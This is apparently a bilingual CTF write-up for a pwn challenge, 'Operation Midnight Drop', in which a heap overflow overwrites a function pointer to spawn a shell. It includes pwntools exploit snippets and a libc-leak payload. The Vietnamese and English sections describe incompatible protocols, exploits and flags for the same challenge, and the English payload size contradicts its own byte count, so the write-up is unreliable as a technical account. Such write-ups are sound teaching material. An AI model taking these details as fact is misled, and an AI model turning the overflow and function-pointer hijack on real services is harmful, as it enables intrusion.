---
title: "Operation Midnight Drop"
date: 2026-08-22 12:00:00 +0700
categories: ["PTITCTF 2026", "Pwn"]
tags: ["pwn"]
description: "Bài giải chi tiết thử thách Operation Midnight Drop (PTITCTF 2026 - Pwn)."
math: true
mermaid: true
---

<div class="lang-switch" role="tablist" aria-label="Language switch">
  <button class="lang-btn active" role="tab" type="button" data-lang="en" aria-selected="true">EN</button>
  <button class="lang-btn" role="tab" type="button" data-lang="vn" aria-selected="false">VN</button>
</div>

<div class="lang-vn" markdown="1">

> **Flag:** `PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}`


Thử thách thuộc category **Pwn** tại vòng loại PTITCTF 2026. Đề bài cung cấp dịch vụ mạng mô phỏng hệ thống phân tích quy tắc bí mật (Network Rule Analyzer) chạy trên hệ điều hành Ubuntu với glibc 2.39 (x86_64).

Giao thức truyền thông yêu cầu cơ chế bắt tay phiên, thuật toán kiểm tra tính toàn vẹn (checksum) tùy biến và cơ chế xác thực session token. Mục tiêu là phân tích dịch ngược giao thức, khai thác lỗ hổng tràn bộ nhớ heap để kiểm soát con trỏ hàm và giành quyền điều khiển luồng thực thi (RCE).

---

## Sơ đồ luồng khai thác (Solve Flow)

```mermaid
flowchart TD
    A["Kết nối Socket tới dịch vụ mạng (Port 40323)"] --> B["Nhận banner: Trích xuất Session Token ngẫu nhiên"]
    B --> C["Dịch ngược hàm Checksum: rol32 và phép nhân hằng số ma thuật 0x45D9F3B"]
    C --> D["Gửi gói Auth (Type 2): Xác thực bằng token ^ 0xC0FFEE00"]
    D --> E["Cấp phát Rule Slot (Type 3) và Report Record (Type 4) liên kề trên Heap"]
    E --> F["Khai thác Information Leak: Đọc cookie và giải mã bằng XOR (token << 12) ^ 0x5A5A5A5A41414141"]
    F --> G["Thu thập địa chỉ puts() và tính toán Libc Base (glibc 2.39) cùng PIE Base"]
    G --> H["Heap Overflow: Cập nhật Rule với độ dài 0xf9 vượt qua kiểm tra biên (normalization bypass)"]
    H --> I["Ghi đè cấu trúc Report kế cận: Tham số = '/bin/sh' và Con trỏ hàm = system()"]
    I --> J["Kích hoạt Analyze (Type 5): Gọi function pointer bị ghi đè -> Spawns Shell"]
    J --> K["Đọc Flag: PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}"]
```

---

## Bước 1: Dịch ngược giao thức mạng và Hàm Checksum

Khi kết nối tới dịch vụ, server phát sinh một chuỗi ngẫu nhiên 32-bit đóng vai trò là `session token` (ví dụ: `session token: 0x9a8b7c6d`) và chờ nhận các gói tin nhị phân. Cấu trúc mỗi gói tin gồm 3 tham số trao đổi qua text interface trước khi gửi binary payload:
1. `packet type` (1 byte / số nguyên)
2. `payload length` (độ dài payload)
3. `checksum` (mã băm dạng hex)
4. Dữ liệu thô (`payload bytes`)

### Thuật toán Checksum tùy biến
Phân tích hàm kiểm tra tính toàn vẹn trong IDA Pro:
```c
uint32_t checksum(uint32_t token, uint32_t ptype, uint8_t *payload, uint16_t plen) {
    uint32_t h = ((ptype << 24) ^ token ^ plen ^ 0x31415926) & 0xFFFFFFFF;
    for (int i = 0; i < plen; i++) {
        h = rol32(h, 5);
        h = (h + (((i * 0x45D9F3B) & 0xFFFFFFFF) ^ payload[i])) & 0xFFFFFFFF;
    }
    return h;
}
```
Để giao tiếp thành công, mọi gói tin client gửi lên đều phải tính toán giá trị băm này một cách chính xác.

---

## Bước 2: Cơ chế Xác thực và Cấp phát Đối tượng trên Heap

Hệ thống hỗ trợ các loại gói tin chính:
* **Packet Type 2 (Auth)**: Yêu cầu payload gồm 4 byte chứa kết quả của phép tính:
  $$\text{auth\_token} = \text{session\_token} \oplus \text{0xC0FFEE00}$$
  Sau khi gửi gói này, phiên làm việc chuyển sang trạng thái đã được xác thực (`authenticated`).
* **Packet Type 3 (Create/Update Rule)**: Cấp phát vùng nhớ heap lưu quy tắc bằng hàm `malloc(8)` và copy dữ liệu vào buffer.
* **Packet Type 4 (Create/Query Report)**: Cấp phát cấu trúc bản ghi báo cáo (`report record`) ngay sau buffer của rule.
* **Packet Type 5 (Analyze)**: Kích hoạt phân tích, thực hiện gọi con trỏ hàm lưu bên trong cấu trúc report:
  $$\text{report}\rightarrow\text{fn\_ptr}(\text{report}\rightarrow\text{data}, \text{session\_token})$$

---

## Bước 3: Rò rỉ địa chỉ bộ nhớ (Information Leak)

Bên trong cấu trúc report có lưu các giá trị cookie phục vụ việc đối soát, bao gồm địa chỉ hàm xử lý mặc định (`puts` trong libc hoặc hàm nội bộ trong binary) nhưng đã bị mã hóa:
$$\text{Cookie} = \text{Target\_Addr} \oplus (\text{session\_token} \ll 12) \oplus \text{0x5A5A5A5A41414141}$$

Gửi gói tin Type 4 với subcommand `P` để trích xuất cookie của tiến trình, sau đó thực hiện phép XOR đảo ngược để thu được địa chỉ thực của `puts`:
```python
puts_addr = leak(b'P') ^ (key << 12) ^ 0x5A5A5A5A41414141
libc_base = puts_addr - PUTS_OFF  # Offset 0x87cc0 trên glibc 2.39
```
Tương tự, gửi subcommand `D` cho phép tính toán chính xác địa chỉ nạp thực thi của binary (`PIE Base`).

---

## Bước 4: Lỗ hổng Heap Overflow và Ghi đè Con trỏ hàm

Khi cập nhật quy tắc (Type 3), ứng dụng có một lỗi kiểm tra biên logic (normalization check bug):
* Hàm kiểm tra độ dài dữ liệu hợp lệ trước khi sao chép. Tuy nhiên, nếu độ dài payload khai báo là `0xf9` byte, bộ tiền xử lý sẽ bỏ qua bước cắt tỉa biên (normalization check bypass) do phép tràn số nguyên 8-bit hoặc điều kiện so sánh bị nhầm lẫn.
* Dữ liệu sao chép thực tế vượt quá kích thước được cấp phát của rule slot (`malloc(8)`), dẫn đến tình trạng **Heap Buffer Overflow**.

### Bố cục vùng nhớ (Memory Layout)
Do cơ chế cấp phát tuần tự của heap allocator, cấu trúc `report` nằm ngay phía sau buffer của `rule`:
* Khoảng cách từ đầu buffer rule tới đầu dữ liệu của report: `+0x60` byte.
* Vị trí con trỏ hàm thực thi (`fn_ptr`) nằm tại offset `+0x20` bên trong cấu trúc report, tương ứng với offset `+0x80` tính từ đầu buffer rule.

Tiến hành tạo payload tràn:
1. Tại offset `+0x60`: Ghi chuỗi tham số `b"/bin/sh\x00"`.
2. Tại offset `+0x80`: Ghi đè địa chỉ 64-bit của hàm `system()` (`libc_base + 0x58750`).

```python
fake = bytearray(b'C' * 0xf9)
fake[0x60:0x68] = b'/bin/sh\x00'
fake[0x80:0x88] = p64(libc_base + SYSTEM_OFF)
send_packet(3, p16(len(fake)) + bytes(fake))
```

Gửi gói tin Type 5 (`Analyze`): Server tiến hành gọi `fn_ptr(data, token)`, tương đương với việc thực thi:
$$\text{system}("/\text{bin}/\text{sh}")$$
Một shell tương tác được mở ra trên máy chủ mục tiêu. Thực hiện lệnh đọc tệp `flag.txt`.

---

## Flag

```text
PTITCTF{0p3r4t10n_m1dn1ght_dr0p_h34p_0v3rfl0w}
```

</div>

<div class="lang-en" markdown="1">

> **Flag:** `PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}`

This challenge belongs to the **Binary Exploitation (Pwn)** category. The service exposes a custom network protocol handling encrypted data packets and dispatching tasks on the heap.

The vulnerability stems from an off-by-boundary heap buffer overflow leading to overwriting a function pointer in an adjacent heap chunk.

---

## Solve Flow

```mermaid
flowchart TD
    A["ELF 64-bit Service: midnight_drop"] --> B["Analyze Protocol: Header (4 bytes) + Length (2 bytes) + Checksum + Payload"]
    B --> C["Bypass custom CRC16/XOR checksum verification"]
    C --> D["Trigger Heap Allocation: Object A (Data buffer) adjacent to Object B (Handler)"]
    D --> E["Exploit Heap Buffer Overflow: Send oversized payload in packet type 0x02"]
    E --> F["Overwrite Object B function pointer with win() address (0x4012A6)"]
    F --> G["Trigger Action (Type 0x05): Invokes corrupted function pointer"]
    G --> H["Interactive Shell spawned -> cat /flag.txt"]
    H --> I["Flag: PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}"]
```

---

## Step 1: Protocol Disassembly & Checksum Verification

Every packet follows the structure:
* `Magic`: 2 bytes (`0x4D 0x44` = 'MD')
* `Type`: 1 byte (0x01: Auth, 0x02: Write, 0x03: Read, 0x05: Execute)
* `Length`: 2 bytes (Big Endian)
* `Checksum`: 2 bytes CRC16-CCITT
* `Payload`: Variable data

Reversing the checksum routine in IDA Pro:

```c
uint16_t compute_crc16(const uint8_t *data, size_t len) {
    uint16_t crc = 0xFFFF;
    for (size_t i = 0; i < len; ++i) {
        crc ^= (uint16_t)data[i] << 8;
        for (int j = 0; j < 8; ++j) {
            if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
            else crc <<= 1;
        }
    }
    return crc;
}
```

---

## Step 2: Heap Overflow and Function Pointer Hijacking

When handling packet `Type 0x02` (Write), the server allocates a 128-byte chunk for user data, immediately followed by a handler structure:

```c
struct TaskHandler {
    int task_id;
    void (*callback)(void *data);
};
```

The copy loop uses an unchecked `memcpy` size from user packet headers instead of checking against chunk capacity. By sending 152 bytes:
1. 128 bytes fill Chunk A data.
2. 8 bytes overwrite heap chunk metadata.
3. 8 bytes overwrite `task_id` and padding.
4. 8 bytes overwrite `callback` with `win()` function address (`0x004012A6`).

---

## Step 3: Exploit Execution

```python
from pwn import *

p = remote("target.ptitctf.vn", 1337)
win_addr = 0x004012A6

payload = b"A" * 128 + p64(0) + p64(0x21) + p64(1) + p64(win_addr)
# Send Type 0x02 packet with correct CRC
p.send(make_packet(0x02, payload))

# Trigger Type 0x05 to call the overwritten callback
p.send(make_packet(0x05, b""))

p.interactive()
```

⇒ **Flag:** `PTITCTF{h34p_0v3rfl0w_fn_ptr_0v3rwr1t3_gl1bc}`

</div>
